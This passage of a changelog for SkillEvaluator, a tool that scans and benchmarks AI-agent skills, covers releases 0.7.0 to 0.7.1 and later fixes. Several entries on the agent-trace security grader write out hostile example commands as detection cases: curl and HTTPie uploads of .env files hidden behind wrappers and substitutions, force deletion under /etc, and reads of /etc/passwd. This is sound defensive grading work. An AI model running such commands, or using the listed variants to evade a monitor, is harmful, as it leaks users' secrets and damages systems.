  shown in a higher band (`49.95%`, not `50.0%`), and derive uplift from the
  displayed scores. Whole-percent rounding of each value separately had
  published contradictions such as `58% → 95% (+36 points)` and
  `50% → 50% (+0 points)`. Scores outside 0–1 and invalid recorded baselines
  are shown as `Not available` instead of being published. The public
  benchmark gate (`scripts/ci/check_public_benchmarks.py`) now rejects a
  Results at a Glance cell whose uplift does not equal the displayed difference
  or whose scores are outside 0–100%; consistent whole-number cards from
  earlier releases still pass.

- Tier 3 `custom_only` runs no longer label a condition without a scoreable
  reward, for example one whose attempts all failed, with the standard metric
  set and `skill-evaluator-dimension-mean-v1` policy. That condition's
  `summary.json`, the agent's recorded metrics and score policies,
  `attempt_policy.json`, and the report's score definition now carry the
  `custom-only` metric set and `custom-overall-v1` policy. When a Harbor job
  never started, both conditions' persisted `summary.json` files record that
  metric set and policy. A failed custom-only agent is therefore no longer
  treated as a standard agent. Scores were already cleared for these
  conditions, and observed rewards still determine their own metric set.

- Tier 3 security grading no longer treats `rm -f` or `rm --force` without
  `-r`, `-R`, or `--recursive` as a destructive command. Routine cleanup such as
  `rm -f out.txt && python run.py` or `find . -name '*.pyc' -exec rm -f {} \;`
  received a critical destructive-command finding and a security score of 0.0
  in both graders, which could fail the Security dimension and the Tier 3
  verdict. Force-only deletion keeps the finding when a target resolves under
  `/bin`, `/boot`, `/etc`, `/home`, `/lib*`, `/root`, `/sbin`, `/usr`, or
  `/var` (except `/var/tmp`), or under `~` or `$HOME`. Brace lists and dot
  globs are expanded first, `find -exec rm -f {}` is checked against find's
  start paths, and a relative target resolves against the directory that the
  tool call's `workdir` and each earlier `cd`, `pushd`, or `popd` leave the
  shell in, so `find / -exec rm -f {} +` and `cd /etc && rm -f hosts` keep the
  finding while `(cd /etc && ls); rm -f out.txt` and
  `echo 'run: cd /etc'; rm -f out.txt` do not. This resolution has a
  per-trace work cap; past it, force-only targets keep the finding, as do
  relative targets after one call moves through more than 32 directories.
  Recursive deletion and `xargs rm -f` are graded as before.

- Tier 3 `--stop-on-pass` runs with local-mode Codex no longer fail to finalize
  when Harbor's best-effort Codex cleanup is skipped, for example after a
  timeout or cancellation. Merging the per-attempt jobs now omits the leftover
  `codex-home` and `codex-secrets` directories in each trial's `agent/` or
  `steps/<step>/agent/` directory, including steps whose names span several
  path components, such as `phase/author`, as declared in the trial's
  `result.json`. Their linked `auth.json` made the merge fail closed, and a
  regular-file `auth.json` was copied into the merged job with the Codex
  credential. Symlink and hard-link checks still apply everywhere else,
  including to the same names at any other depth.

- Tier 3 security grading no longer reports a network-exfiltration warning,
  which lowered the Security score to 0.5, when a command only names `curl`,
  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
  comment or here-document prose. Every client named after another command is
  now checked with its own upload rules, as for a direct invocation, so
  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
  request through a command that is not a runner, such as `strace -f curl URL`
  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
  mention followed by an HTTP method, an upload flag, or a `key=value` word,
  such as `http POST` in prose, still warns.
  A fixed set of runners that start a command in another host, container, root,
  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
  `ip netns exec`, warns on any client named after it, even one named only as
  data, as in `docker exec app apt-get install -y curl`. That holds when the
  runner is the command itself, including after a compound keyword, function
  header, `case` pattern, or `coproc`, also when glued to it
  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
  that wraps it is called. A runner reached through another command, as in
  `find . -exec ssh host curl URL \;` or
  `git submodule foreach ssh host curl URL`, and a runner outside the set are
  checked only with the client's upload rules.
  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
  `sudo < .env http URL`, `2>&1 < .env http URL`,
  `case "$1" in *) < .env http URL;; esac`, and
  `while read -r l; do http URL; done < .env` still warn. A function that wraps
  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
  and a `$VAR` command word with no known value, in an action that names curl
  or wget as a word, gets the curl and wget upload rules, as in
  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
  whose commands names a client or runner, such as `$(which curl)`,
  `$(env which curl)`, `$(cd /tmp && which curl)`,
  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
  `printf -v` assignment, resolve to that command; a fallback chain such as
  `$(command -v wget || command -v curl)` is checked once for each name. A
  command printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its
  printed arguments. Both the host checker and the bundled Harbor verifier
  apply these rules.

- `similarity-check --catalog` and `tier2 --catalog` no longer report a skill
  that is already in the local catalog as an `EXACT_DUPLICATE` of its own
  entry, which failed the run. An entry is skipped as the skill's own only when
  its content fingerprint matches, its path ends the skill's path, and more
  than half of up to eight other catalog skills, spread evenly across the
  catalog's path-sorted list, are present unchanged at their recorded paths
  around it. The skip is recorded under
  `self_matches_excluded` and `excluded_catalog_paths`. Verbatim copies and
  same-name skills outside the catalog's tree are still reported; a copy of
  most of the tree, such as a second checkout, counts as the same tree. An
  edited skill whose name, description, or (with `--full-body`) `SKILL.md`
  changed is still compared with its old entry; build the catalog from the tree
  you screen.

## 0.7.1 - 2026-11-02

### Added

- Include `skillevaluator ci init`, `ci status` and `ci demo` in the Python
  package. Guided GitHub onboarding discovers skills, configures checks and
  optional public hosted reports, and opens a reviewable setup PR. An optional
  test PR demonstrates the results. Existing Pages sites and organization
  action restrictions are preserved; private repositories can use checks only.

- Add a visual CLI onboarding guide under GitHub Actions, alongside the manual
  template path. Keep GitHub and GitLab as the two repository-integration choices.

- Allow CI release templates to pin the reviewed report publisher separately
  from the verified scanner workflow and image.

- In local mode (`--env-mode local`), a missing Claude Code, Codex, or OpenCode
  CLI is offered as a pinned npm install into the SkillEvaluator runtime folder;
  without a terminal, the command is printed instead.

- `doctor` and `health-check` take `--tier 1|2|3|all`, so Tier 1 and Tier 2
  readiness can be checked before a run instead of surfacing mid-validation.
  Tier 1 reports each scanner that the `--checks` selection runs: SkillSpector,
  Bandit, Semgrep, Gitleaks, and pip-audit for `dependency`. Each row shows the
  resolved path, any executable override, and the version from a bounded,
  shell-free probe. A scanner fails when it is missing, its override is
  malformed, its probe fails or exceeds `--timeout` (default 60 seconds, at
  most 3600), or it is older than Bandit 1.9.4 or Gitleaks 8. Tier 2 resolves
  the embedding and LLM providers offline. `doctor --tier 2 --verify-models`
  also sends one embedding request and one chat request, each bounded by
  `--timeout` and sent without retries, and reports only the HTTP status and a
  remedy. `--tier all` checks every tier, and a failed tier does not stop the
  next. Without `--tier`, both commands still check Tier 3 only. An option for
  an unselected tier, or `--timeout` for an offline Tier 2 check, is a usage
  error. `tier3 doctor` remains Tier 3-only.

- `--skip-with-skill` on `tier3 evaluate` and the direct `tier3` workflow runs
  only the without-skill baseline arm, for example to calibrate a task set or
  re-measure a baseline after a model change without paying for with-skill
  trials. Only baseline tasks are staged and launched. The run is reported as
  a baseline calibration: `mode` is `baseline_only`, the overall score and best
  agent come from the baseline arm, the with-skill arm is recorded as
  `skipped`, with-skill scores and lift stay unavailable instead of becoming
  0.0 (report tables print `skipped`), and the verdict stays NEUTRAL. The flag
  is mutually exclusive with `--skip-baseline`, keeps the baseline isolation
  rules, and is not accepted by `validate`, so a baseline-only run cannot pass
  a Tier 3 gate.

- Tier 1 sets up SkillSpector 2.13.3 and Gitleaks 8.30.0 on first use from
  pinned, SHA-256-verified releases, without a prompt; Semgrep is optional
  unless `SKILLEVALUATOR_REQUIRE_SEMGREP=1`. `--skip <check>` on `validate` and
  `tier1` leaves a check out and reports it as skipped. A `scanners` row and the
  JSON report record which scanner versions ran.

### Changed

- Shared LLM calls and the Harbor verifier retry HTTP 408, 429, and every 5xx
  response except 501 and 505, including proxy 520–524 and overload 529 errors.
  TLS certificate verification failures stop immediately. The host Bedrock
  path preserves the underlying status and certificate failure through
  LiteLLM wrappers, so generic 500/503 errors do not cause extra attempts.
  This applies to ordinary skill evaluations and other host LLM calls as well
  as plugin evaluations; retry limits and scoring formulas are unchanged.

- The compact `validate` view lists every Tier 3 test case with and without
  the skill, updates the list while trials run, and ends each tier with a short
  "what to fix" list: the problem, then the action. A required scanner that
  could not run counts as "didn't run", not as a failed check.

### Fixed

- PR scan comments show the verdict, quality scores, first actionable fixes and
  report links; full provenance and detailed findings stay in the report.

- Hosted reports use the retained site commit as the Pages deployment identity,
  so repeated publications from one default-branch revision deploy fresh reports.

- Reusable Tier 1 CI always requires Semgrep in scanner subprocesses, so local
  optional-scanner defaults cannot hide missing CI code-scanning coverage.

- Use public, commit-pinned README image URLs so the wordmark and three-tier
  diagram can render in PyPI package descriptions as well as on GitHub.

- On Windows, repository root and source-link detection no longer break for
  repositories in non-ASCII folders. Git's repository path is decoded as a file
  name and its remote URL and branch as UTF-8, instead of with the locale code
  page.

- A chat model that declines to classify a Tier 2 content cluster (a safety
  refusal, which some models return for security-themed skill content) no
  longer marks the scan incomplete and fails `validate` under the default
  `--block-on-dedup`. Tier 2 now reports the refusal as an advisory MEDIUM
  `llm_refused` finding that names the overlapping sections, and the JSON
  report's `llm_analysis` counts it in `clusters_refused`. Other chat-LLM
  failures still leave the scan incomplete. Raise `CONTENT_DEDUP.llm_refused`
  in a policy overlay to keep refusals blocking.

- Tier 1 security scans no longer fail a skill for an exact read-only
  `/etc/passwd` bind mount such as `docker run -v /etc/passwd:/etc/passwd:ro`.
  SkillSpector 2.11.1 and later tags this mount as likely benign but still
  reports a HIGH Credential Access (PE3) finding. That finding is now ignored
  only when it carries both benign-context tags and every `/etc/passwd` on the
  reported source line, read without following links, is the source or target
  of such a mount. The aggregate risk score is recomputed without it. Writable
  or implicit-mode mounts, other paths, same-line reads such as
  `cat /etc/passwd`, aggregated rows, and earlier SkillSpector versions still
  block. Captured SkillSpector 2.13.3 reports cover both mount operands and a
  separate blocking read, and partial LLM-response inspection stays incomplete.
  Static reports are accepted when a provider is available but LLM analysis
  was neither requested nor applied; availability alone is not execution.

- The Tier 1 SkillSpector scan of a skill that references PNG or JPEG images,
  such as a logo shown with `![Logo](assets/logo.png)`, is no longer
  `INCOMPLETE` only because SkillSpector's text pattern analyzers cannot read
  images and report the analysis as `partial`. That gap is now a warning when
  the report shows no other gap and no fatal scope exclusion, and each image
  is a regular, single-link (not hard-linked), non-executable file whose bytes
  have the chunk or marker structure of a PNG or JPEG, is not reached through
  a symlink, and is not in a directory that agents run, load as instructions
  or read as configuration. The gap is accepted for at most 256 images and
  128 MiB of image data in total. The structure check corroborates the file
  type without decoding the image or proving that it renders. PNG IDAT
  compressed data and ancillary chunks, and JPEG entropy-coded data and APPn
  or COM segments, are not inspected and can still carry other bytes. Other
  image formats, files without that structure, and every other partial reason
  still leave the scan `INCOMPLETE`. SkillSpector's own High `AE1` findings for
  images it could not inspect are unchanged.

- Tier 3 plain progress output, which `--progress auto` selects for CI and
  redirected logs, now repeats its `still running` heartbeat every 60 seconds
  instead of every second, so long runs no longer add thousands of identical
  lines per hour. The interactive Rich view still refreshes every second. A
  new `--progress-interval SECONDS` option on `tier3 evaluate` and `tier3 PATH`
  sets the interval explicitly for either view (0.05 to 86400 seconds;
  non-finite values are rejected).

- SkillSpector runs are no longer stopped after a fixed 300 seconds, which ended
  slow `--llm` security scans, such as those on local models, as `INCOMPLETE`
  before SkillSpector's own scan deadline (1,080 seconds in v2.13.3). Each run
  now has a 1,200-second watchdog by default; set
  `SKILLEVALUATOR_SKILLSPECTOR_TIMEOUT_SECONDS` to a positive integer to change
  it (values above 86400 are capped). `SKILLSPECTOR_MAX_WORKFLOW_SECONDS` is now
  forwarded to SkillSpector so its own deadline can be raised as well, and the
  security result records the effective `skillspector_timeout_seconds`
  ([#155](https://github.com/NVIDIA/SkillEvaluator/issues/155)).

## 0.7.0 - 2026-11-02

### Added

- Custom execution backends. An installed package can add an `--env-mode`
  through the `skillevaluator.env_modes` entry-point group, naming an
  `EnvironmentBackendSpec` with a Harbor environment class plus the `--ek`
  kwargs, host variables, prerequisite hook, and optional agent wrappers that
  backend accepts. Custom execution backends follow the same kwarg and
  `runtime_env` policy as Harbor-native backends, may not forward agent,
  provider, or other backends' credentials, cannot replace a built-in mode or
  share a name with another installed package, are not named on published
  benchmark cards, and can be turned off with
  `SKILLEVALUATOR_DISABLE_CUSTOM_BACKENDS=1`.
- The lightweight `publisher` install extra adds the dependencies for verifying
  GitHub-signed execution receipts without installing the Tier 3 runtime.
- Private Python helpers add bounded plugin manifest discovery, component
  inventories, hook/MCP/LSP/settings and permission checks, context estimates,
  dependency and endpoint audits, and local catalog comparisons. Private
  runtime helpers collect canary and hook evidence for explicit callers.
- Support Python 3.14 alongside Python 3.12 and 3.13, including installation
  guidance and CI coverage for tests and built packages.
- Add reusable GitLab CI onboarding and configurable Tier 1 quality thresholds,
  alongside a shared repository integration guide.
- Opt-in `SKILL_EVAL_JUDGE_CHARACTER_FACTS=1` adds bounded, escaped Unicode
  character facts to Tier 3 accuracy, goal-accuracy, and behavior-check prompts
  without normalizing the evidence. The operator setting is verifier-only;
  enabling it selects the prompt-based goal judge instead of the optional RAGAS
  route. Metadata uses the same text rendering as the judge prompts, including
  numeric and nullable fields. Existing prompts remain unchanged when the
  setting is unset.

- `tier3 evaluate` now leads with a case-first summary: a verdict line and one
  row per `evals.json` case. With one agent, each row shows, for with and
  without the skill, the pass count, per-attempt marks (`✓` pass, `✗` fail,
  `⊘` did not run, `·` skipped after a pass) and mean score, plus an effect
  column (`helps`, `hurts`, `both fail`, `better score`, `worse score`,
  `no change`, `inconclusive`). With several agents, each agent gets a column
  showing without-skill → with-skill marks and the pass-rate change. Success
  rate, quality score, and dimensions follow. A "How to improve" list follows,
  capped at three. It puts run errors last and ranks each group by attempts
  lost; each item names the case,
  agent, issue type (`skill`, `skill not used`, `skill hurts`, `environment`,
  `run error`, `eval case`, `missing input`, `goal not met`), one action, and an evidence
  path, and is also written to `what_to_fix.json` in the run directory. When
  nothing needs fixing it prints a one-line "nothing to fix" instead. The
  verdict is `inconclusive` when attempts did not run. The per-evaluator and
  per-dimension tables and metric findings moved behind the new `--verbose`
  flag and remain in `report.html`.
- `goal not met` flags with-skill attempts that pass on the aggregate score
  while the judge scored goal accuracy 0.00 (for example, the agent only asked
  for details).
- `report.html` leads with the same case-based findings: "Verdict at a glance"
  adds the per-case result, the highest-scoring agent versus the biggest skill
  lift, and the goal-not-met count; "Conclusion & Next Steps" and the Insights
  recommendations list the `what_to_fix.json` fixes (or "Nothing to fix").
  Data fixes elsewhere: Pass@K shows attempts passed, a regressed passing
  dimension reads "PASS · regressed" with its weakest signal, resource totals
  are formatted with units and percent change, Attempt Details groups each
  case's with/without rows and marks passes that missed the goal, and Error
  Recovery lists only trials with faults, retries or warnings.
- Reusable GitHub Actions onboarding for complete Tier 1 checks, with
  pinned runtime/workflow consumer templates, affected-skill PR selection,
  optional hosted reports and updated PR feedback. The new guide separates
  basic scanning from publisher setup; public image publication and generated
  release files require a reviewed manual release before consumer use. The
  Tier 1 image is a multi-stage build with precompiled bytecode that ships only
  the locked Semgrep, SkillSpector and SkillEvaluator environments, Gitleaks,
  `ci/` and the license files. A release builds it without cached layers and
  pushes the image it smoke-tested.
- The reusable Tier 1 workflow scans up to four skills at once. The
  `scan-workers` input (1 to 16) changes this, and `1` scans one skill at a
  time. Each worker gets its own private home and temporary directory. Logs,
  annotations and report rows keep skill order, and skills not started when the
  scan time budget runs out are still reported as not evaluated. A timeout,
  Ctrl-C or an error while saving results ends running scans together with
  the scanner tools they started.
- `--quality-config PATH` on `validate`, `quality-check`, and `tier1` loads the
  deterministic quality check's expected Markdown headings from a YAML file
  instead of the built-in list. Each `expected_headers` entry sets a `heading`
  and optional `alternatives`, `points` (default 5), `message`, and
  `suggestion`; omitted message and suggestion text is generated from the
  headings. Without the flag, the packaged `quality-default.yaml` reproduces
  the previous Prerequisites, Limitations, and Troubleshooting checks and
  wording, so default scores are unchanged. An invalid file (bad YAML or
  unparseable values, unknown keys, duplicate keys or headings, non-heading
  values) is rejected before validation starts with exit code 2 and a message
  naming the file and field, even when `--checks` leaves out `quality`. The JSON report, Markdown report,
  and BENCHMARK.md record which config produced the quality score as
  `quality_config` (`packaged` or `custom`, the custom file's name, a
  `sha256:` digest of the normalized rules, and the `--min-score` pass
  threshold, which is kept out of the digest).
- CI-native per-skill HTML pages link Download JSON to the retained
  `skillevaluator-tier1.json` and do not embed a second copy of the report
  JSON. Standalone CLI HTML reports embed it for Export JSON.
- Tier 3 runs can be limited to the first N eval cases with the opt-in
  `--max-cases N` flag on `validate`, `tier3`, and `tier3 evaluate`, or the
  `harbor.max_cases` key in `evals/config.yml`; the CLI value wins. Unset, every
  case runs as before. Cases are taken in staged order (dataset order, or
  task-directory name order for native Harbor tasks) and the same subset runs
  for every agent's with-skill and baseline arms. The dataset snapshot and
  expected-case checks cover only the cases that ran, `run_config.json` records
  the selection as `case_selection`, and a run that skipped cases is reported
  as publication-incomplete in JSON, HTML, and BENCHMARK.md.

- Tier 1 `--llm` security scans of a single skill keep the LLM provenance that
  SkillSpector v2.12.0 and later report: the provider adapter, the model and
  SkillSpector revision behind each LLM analyzer, and the sampling and
  determinism evidence. The Security result in the JSON report carries it as
  `skillspector_llm_provenance`, next to `skillspector_provider_id`, the
  SkillEvaluator provider the scan was bridged from (for example `nv_build`).
  The HTML report, including
  CI pages rendered from the retained Tier 1 JSON, lists it in a collapsible
  Tier 1 LLM Provenance table. The record is also kept when the LLM stage
  fails or SkillSpector does not confirm LLM analysis, as long as
  SkillSpector's JSON output carries a valid record, so the report shows what
  was attempted. Records that do not match SkillSpector's provenance contract or
  that contain endpoint- or credential-shaped values are left out, and older
  SkillSpector releases produce no record.

### Changed

- Hosted GitHub reports verify a separate GitHub-signed execution receipt.
  Enable `id-token: write` in the scan workflow and refresh its approved blob
  when adding hosting; ordinary scans keep their existing read-only permissions.
- Link GitHub and GitLab source templates directly from the README and onboarding
  guides. Keep report, log and PR comment examples in the public repository,
  removing onboarding dependencies on personal demo links.
- GitHub onboarding shows the PR comment example directly on the page and
  explains the two templates and required one-time publisher setup.
- HTML reports use a verdict-led layout with a sidebar and expandable check
  details. The verdict replaces the pass percentage; checks marked Not
  applicable are excluded from passed and executed counts. Publication status
  remains visible on mobile and in print, and blocking/advisory findings retain
  their separate counts.
- The HTML report opens on the answer. The skill name is the page title, and
  the header shows one verdict, the date and version, and Download JSON. A
  summary gives the verdict with a one-line reason, four numbers with one
  definition of a finding, and a Fix first list of up to five places, most
  severe first and linked to their evidence. A scanner that did not finish is
  listed first with its own reason, and two scanners reporting one location
  take one entry. Scanner diagnostics always show and print.
  Failed checks are listed first, raw check IDs get plain names, and
  publication eligibility sits next to the verdict.
- The HTML report, the CI index and the Pages history use one verdict
  vocabulary: Passed, Changes required, Incomplete, Skipped and Neutral. When
  no check ran, the header and the summary both say Skipped. A failing tier
  whose gate does not block shows Failed (advisory). The CI index names the
  same first fix as each skill's report and links to it.
- The SkillEvaluator logo replaces the letter tile and the green square on
  every report page, the CI index and the Pages history. Colors use one
  palette built on the logo greens, with WCAG AA text contrast in light and
  dark themes. The report follows the system theme until the reader picks
  one, and prints dark text on white paper, Tier 3 charts included. No text is
  smaller than 11 px, and short table cells no longer break mid-word.
- Dependency audits inspect pinned package versions without installing packages
  or executing build scripts. Unpinned, URL and other unresolved requirements
  report incomplete coverage instead of executing package resolution.
- The CLI reference now compares the direct `tier1`, `tier2`, and `tier3`
  workflows with `validate --tiers`: which tiers run, Tier 1 dependency and LLM
  stages, report files, and exit codes. It also states that `--tiers` must
  include Tier 1, so Tier 2 or Tier 3 alone runs through its direct workflow.
- Install instructions, the CI recipe, the missing-scanner hint and the Tier 1
  CI image's scanner lock now pin SkillSpector to `v2.13.3` instead of
  `v2.12.0`. With `v2.12.0`, the Tier 1 security check could be `INCOMPLETE`
  or fail for skills with no real issue: valid Python and Perl helpers were
  recorded as only partially inspected
  (`static_parse_limit` or `obfuscated_instruction_text`,
  [NVIDIA/SkillSpector#777](https://github.com/NVIDIA/SkillSpector/pull/777)),
  the bytecode check could hit its time budget while waiting behind other
  analyzers (`runtime_limit`,
  [NVIDIA/SkillSpector#828](https://github.com/NVIDIA/SkillSpector/pull/828)),
  and visible text between HTML comments raised High P2 hidden-instruction
  findings
  ([NVIDIA/SkillSpector#452](https://github.com/NVIDIA/SkillSpector/pull/452)).
  An existing SkillSpector install keeps its version until you rerun the
  install command. `v2.13.3` still does not return structured output for
  Claude 5.5 models, so set `SKILLSPECTOR_MODEL` as before when
  `SKILL_EVAL_LLM_MODEL` names one.
- README and onboarding docs now offer two first-run paths: a lightweight,
  keyless quality check on a bundled skill, or an NVIDIA Build rubric evaluation
  with eligible free prototyping access. Installation adds extras as needed,
  and the guides separate quality results from full scanner and live-agent
  evidence.
- The optional GitHub report publisher downloads only a small
  `skill-evaluator-tier1-evidence-attempt-N` artifact holding `summary.json`
  and each skill's JSON. At 99 skills the download drops from 4.2 MB to
  0.46 MB, and HTML, SARIF and logs no longer count toward its 64 MiB limit.
  A scan from an evaluator revision that does not upload this artifact cannot
  be published. Re-running it reuses that evaluator, so update the scan caller
  and the publisher allowlists, then start a new scan. When an automatic run
  commits nothing new, the publisher skips its Pages deploy and PR comment and
  leaves both to the run that pushed that content. The publisher also installs
  uv into a private environment instead of the runner's system Python, checks
  out only the tool files each job needs and replaces site files atomically.
  It and the PR comment helper share one GitHub client, which rejects sibling
  repository endpoints and NaN or Infinity in JSON for both.
- HTML reports rendered in one process share one compiled template
  environment, so each template compiles once per process instead of once per
  report.

### Documentation

- Give the performance dashboard its own sidebar guide, retain the previous
  Reports & Results link, and explain matching-judge and activation limits on
  comparisons. Clarify the independent per-skill quality threshold, Windows
  Docker setup, and custom-backend and MCP environment controls.

### Fixed

- Tier 3 reports preserve judge-model exclusions when calculating dimension and
  overall lift. Native multi-step results also retain the judge provenance needed
  for those comparisons, so fallback judges cannot turn a regression into an
  apparent improvement. Judge-free cases retain valid lift, bounded report loads
  use the collector's recorded comparisons, and FINAL-strategy trials use only
  the final step's judges. The CLI displays unavailable comparisons as `n/a`.
  Dashboard score differences preserve the same matching-judge lift, including
  unavailable comparisons.
- The LLM judge treats a schema option reported as `unavailable` as a schema
  rejection and retries without it, so OpenAI-compatible endpoints such as
  DeepSeek, which answer `response_format: json_schema` with HTTP 400 and
  "This response_format type is unavailable now", can score Tier 3 instead
  of failing every judge call (fixes #207).
- External scanners no longer crash the scan when they print bytes that the
  selected text codec cannot decode (for example a Windows traceback with a
  CJK path). Those bytes are replaced, so the captured output is never `None`,
  and valid output keeps the selected codec and universal-newline handling.
- The Tier 1 LLM rubric gives reasoning models (DeepSeek R and V4, OpenAI o1,
  o3, o4 and GPT-5 families, and models named "reasoning") a 32,768-token
  budget instead of the default 16,384, giving hidden reasoning more room
  before the rubric JSON is emitted. The budget follows the model each request
  resolves to, is capped at 16,384 on the Anthropic provider, and an explicit
  `max_tokens` overrides this default, subject to provider and model limits.
- `doctor --env-mode docker` and Tier 3 runs on Windows now find the Harbor
  CLI installed next to the active interpreter as `harbor.exe` or
  `harbor.cmd`, instead of reporting "harbor CLI not found".
- Tier 3 records `accuracy` and `goal_accuracy` as N/A when an eval case has
  no reference answer, and `behavior_check` as N/A when it has no expected
  behavior, without calling those judges. `skill_execution` and
  `skill_efficiency` are N/A in a baseline arm with no skill it could activate;
  staged acceptable alternatives keep them applicable. Scores and lift exclude
  explicitly marked N/A metrics, while Security remains required and missing
  or failed evidence stays incomplete. Pass-rate lift uses the metrics shared
  by both arms, so activation alone cannot create lift.

- On Windows, repository root and source-link detection no longer break for
  repositories in non-ASCII folders: Git output is decoded as UTF-8 instead of
  the locale code page.
- Private plugin risk checks preserve PowerShell semantics in hook conditions,
  grants, findings and remediation; denying Bash no longer hides a PowerShell
  grant.
- CI quality thresholds apply to every parallel scan worker. Report overviews
  and detailed reports surface failed quality gates ahead of advisory findings,
  with links to the check that needs attention.
- Tier 2 caps every intra-skill embedding chunk at 3,000 characters, preserves
  meaningful short tails and actual Python docstring source ranges, and avoids
  counting pieces of one original chunk as duplicates of each other. Oversized
  Markdown sections are packed by paragraph, so short labels and fragments stay
  attached to their neighbours, source ranges retain blank-line gaps, and findings
  list a split source once.
- Local-mode verifier uploads now copy directly to the absent destination,
  avoiding an unnecessary rollback snapshot of an empty tests directory.
  Inputs and rewritten scripts are prepared privately before publication,
  so failed uploads preserve existing verifier files. Missing or invalid
  sources fail rather than creating an empty verifier directory. Per-step
  verifier uploads retain shared test files, with step files taking precedence.
  After any command runs, the next upload replaces the tests directory, so
  files or links the agent left there cannot change verification.
- Harbor's standalone verifier now runs on Python 3.9 task images after sharing
  deterministic checks with the host evaluator, and honours HTTP-date
  `Retry-After` headers there. CI scores a sample trajectory with the packaged
  verifier on a real Python 3.9 interpreter to retain this compatibility.
- With `--stop-on-pass`, a retained Harbor agent timeout followed by a matching
  completed attempt no longer invalidates the scored result. Timeout rewards
  remain excluded, failure history is retained, and the JSON summaries
  distinguish scored, recovered, and intentionally skipped attempts. Recovered
  timeouts are reported under `recovered_trial_failures` and
  `historical_job_failures` instead of as active failures. Other execution failures and
  incomplete comparisons still fail validation.
- Plain removal of recognized regenerable caches no longer receives the Tier 3
  destructive-command penalty. Dynamic commands, mixed targets and other
  destructive operations retain their existing classification in both verifiers.

- Rubric evaluation preserves the original `SKILL.md` text without adding YAML
  separators and includes reachable local Markdown guides under their source
  paths. Required guidance is collected before optional previews, with cycle
  detection, secure contained reads, verified file-alias deduplication, a
  256-document ceiling, and the existing
  3,000-byte per-file / 30,000-byte supplementary limits. Missing, unsafe, or
  oversized required guidance stops judging without a score or provider request
  ([#233](https://github.com/NVIDIA/SkillEvaluator/issues/233)).

- PII credential findings mask their values and source lines. GitHub CI stages
  scanner output privately, redacts recognized credential values from retained
  reports and logs, and withholds detailed output when redaction cannot finish.
- Local Claude Code trials retain Harbor's instruction environment variables so
  prompts reach `claude --print`. The exception accepts only the legacy
  `HARBOR_INSTRUCTION` name and Claude Code's UUID-named instruction variable;
  protected paths, loader controls, and unrelated Harbor variables retain their
  existing filtering ([#245](https://github.com/NVIDIA/SkillEvaluator/issues/245)).

- Tier 3 reports preserve unavailable evaluator lift as `null` when no baseline
  ran, rather than reporting a measured zero. CLI evaluator tables display
  missing or unavailable scores as `n/a` without interrupting JSON and HTML
  report generation; measured zeroes retain their numeric formatting
  ([#240](https://github.com/NVIDIA/SkillEvaluator/issues/240)).

- Tier 3 HTML reports no longer label a recorded baseline as missing. When an
  agent or dimension has a baseline score but no comparable lift, for example
  because the arms used different score policies or no case kept matching judge
  models, the dimension grid, agent scorecards, and Skill Lift card now say
  "comparison unavailable" instead of "no baseline". Rows with no baseline
  score, such as `--skip-baseline` runs, keep "no baseline".

- Explicit searches of `/` (`find`, `grep -r`, `rg`, `ag`, `du` and `tree` with a
  `/` operand, and native search tools rooted at `/`) now count as wasted tool
  calls whether or not they name the expected skill or script, including when
  output is redirected or the search runs inside `sh -c`. Host and bundled
  scoring agree, while scoped searches and slash-valued patterns retain their
  classification.

- Tier 3 `claude-code` trials no longer hang until the agent timeout after the
  agent has already answered. Claude Code moves a shell command that outlasts
  its Bash timeout to the background, and a headless run waits for background
  commands before it exits, so a command that never finishes (for example a
  `grep -r /` search for a missing skill) held the trial open and the case was
  recorded as an unscored agent timeout. Generated and native tasks now set
  `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1` in the task environment for every
  env mode, so each command finishes in its turn or is stopped at Claude Code's
  Bash timeout (2 minutes unless the agent requests a longer one). Neither
  `harbor.runtime_env` nor a native task's `[environment.env]` can turn
  background tasks back on, and other agents ignore the variable. A skill whose
  single commands need longer can raise Claude Code's default with
  `BASH_DEFAULT_TIMEOUT_MS` in `harbor.runtime_env`.

- PII email scans recognize all RFC 2606 reserved domains, including their
  subdomains, mixed-case forms, trailing dots, and prose ellipses. A local-part
  boundary prevents quadratic rescanning of long excluded addresses. Ordinary
  addresses on the same line and domains that merely resemble placeholders remain detectable
  ([#244](https://github.com/NVIDIA/SkillEvaluator/issues/244)).

- A skill that exceeds a Tier 2 context-deduplication work limit (more than
  512 content chunks, too much pairwise comparison work, or an LLM-review limit:
  more than 50 candidate clusters, more than 64 members in one cluster, or an
  oversized per-cluster or total review prompt) is now reported as
  **INCOMPLETE** instead of failing with a CRITICAL `chunk_count_limit`,
  `scalar_comparison_limit`, `llm_cluster_count_limit`,
  `llm_cluster_member_limit`, `llm_prompt_size_limit`, or
  `llm_total_prompt_size_limit` finding. Those findings read as duplicate
  content in the skill and showed `FAILED` with "Publication blocked" in
  BENCHMARK.md, and a policy severity override could downgrade them into a pass
  with no duplicate analysis. Exit codes are otherwise unchanged. An execution
  error names the limit, and the JSON report records it under `work_limit`.

- Tier 3 security grading preserves ordinary nested `/tmp` cleanup, including
  child operands with trailing slashes, unless the current or an earlier
  execution action contains recognized symlink-creation syntax (`ln -s`,
  `cp -s`, `os.symlink`, `Path.symlink_to`, literal Python subprocess argv
  launching `ln`/`cp`, or `fs.symlink`/`fs.symlinkSync`). With that evidence,
  both graders withhold nested-cleanup exemptions and report critical
